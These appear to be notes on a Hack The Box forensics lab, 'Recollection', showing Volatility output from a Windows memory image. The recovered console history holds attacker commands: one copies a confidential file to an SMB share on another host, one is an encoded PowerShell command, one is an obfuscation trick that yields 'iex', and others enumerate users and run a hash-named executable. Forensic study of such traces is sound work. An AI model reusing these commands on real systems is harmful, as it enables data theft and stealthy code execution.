[Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - Securonix](https://www.securonix.com/blog/hiding-the-powershell-execution-flow/)
[Recollection \| Unmasking Unix Auth Logs: The Brutus Challenge \| Hack The Box \| Sherlocks - YouTube](https://www.youtube.com/watch?v=j5lCLOxlKBA)
volatility - [Installation · volatilityfoundation/volatility Wiki · GitHub](https://github.com/volatilityfoundation/volatility/wiki/installation)


python2 vol.py -f ../recollection.bin imageinfo
```bash
  Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/hacking/sherlocks/recollection/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```


python2 vol.py --profile Win7SP1x64 -f ../recollection.bin clipboard
```bash
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ ------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
         1 WinSta0       0x0L                              0x0 ------------------           
```


python2 vol.py --profile Win7SP1x64 -f ../recollection.bin consoles
```powershell
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
----
CommandHistory: 0xbebe0 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xc2f80: powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"
Cmd #1 at 0xbd660: powershell
----
Screen 0xa10c0 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]                                            
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                 
                                                                                
C:\Users\user>powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"            
iex                                                                             
                                                                                
C:\Users\user>powershell                                                        
Windows PowerShell                                                              
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                  
                                                                                
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.                                                 
At line:1 char:47                                                               
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p 
ass.txt                                                                         
    + CategoryInfo          : OpenError: (:) [], IOException                    
    + FullyQualifiedErrorId : FileOpenFailure                                   
                                                                                
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1x
QdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"                                              
The term '??????????????????????????????' is not recognized as the name of a cm 
dlet, function, script file, or operable program. Check the spelling of the nam 
e, or if a path was included, verify that the path is correct and try again.    
At line:1 char:31                                                               
+ ?????????????????????????????? <<<<                                           
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:  
   String) [], CommandNotFoundException                                         
    + FullyQualifiedErrorId : CommandNotFoundException                          
                                                                                
PS C:\Users\user> powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2V
yc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"                                          
The term '??????????????????????????????' is not recognized as the name of a cm 
dlet, function, script file, or operable program. Check the spelling of the nam 
e, or if a path was included, verify that the path is correct and try again.    
At line:1 char:31                                                               
+ ?????????????????????????????? <<<<                                           
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:  
   String) [], CommandNotFoundException                                         
    + FullyQualifiedErrorId : CommandNotFoundException                          
                                                                                
PS C:\Users\user> cd .\Downloads                                                
PS C:\Users\user\Downloads> ls                                                  
                                                                                
                                                                                
    Directory: C:\Users\user\Downloads                                          
                                                                                
                                                                                
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.exe 
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc 
                                             1ac02d5b4d8fd31720978c02635cb1.zip 
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591 
                                             f6be48407f896b75e1320628346b03.zip 
-a---        12/19/2022   3:00 PM     309248 csrsss.exe                         
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi           
                                                                                
                                                                                
PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd317
20978c02635cb1.exe                                                              
PS C:\Users\user\Downloads>                                                     
**************************************************
ConsoleProcess: conhost.exe Pid: 2312
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 4 HistoryBufferMax: 4
OriginalTitle: Windows PowerShell
Title: Windows PowerShell
AttachedProcess: powershell.exe Pid: 3688 Handle: 0x60
----
CommandHistory: 0x1be7b0 Application: powershell.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1be500 Application: net1.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xddaf0 Application: net.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1bdab0 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xd7980: gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #1 at 0xd79d0: (gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #2 at 0x1bc560: net users
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #4 at 0xd7a20: (gv '*MDR*').naMe[3,11,2]-joIN''
----
Screen 0xe18a0 X:120 Y:3000
Dump:
Windows PowerShell                                                                                                      
Copyright (C) 2009 Microsoft Corporation. All rights reserved.                                                          
                                                                                                                        
PS C:\Users\user> gv '*MDR*').naMe[3,11,2]-joIN''                                                                       
Unexpected token ')' in expression or statement.                                                                        
At line:1 char:12                                                                                                       
+ gv '*MDR*') <<<< .naMe[3,11,2]-joIN''                                                                                 
    + CategoryInfo          : ParserError: ():String) [], ParentContainsErrorRecordException                            
    + FullyQualifiedErrorId : UnexpectedToken                                                                           
                                                                                                                        
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex                                                                                                                     
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC                                                                                             
                                                                                                                        
-------------------------------------------------------------------------------                                         
Administrator            Guest                    user                                                                  
The command completed successfully.                                                                                     
                                                                                                                        
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.     
At line:1 char:31                                                                                                       
+ ?????????????????????????????? <<<<                                                                                   
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:String) [], CommandNotFoundException      
    + FullyQualifiedErrorId : CommandNotFoundException                                                                  
                                                                                                                        
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex                                                                                                                     
PS C:\Users\user>                                                                                                       

```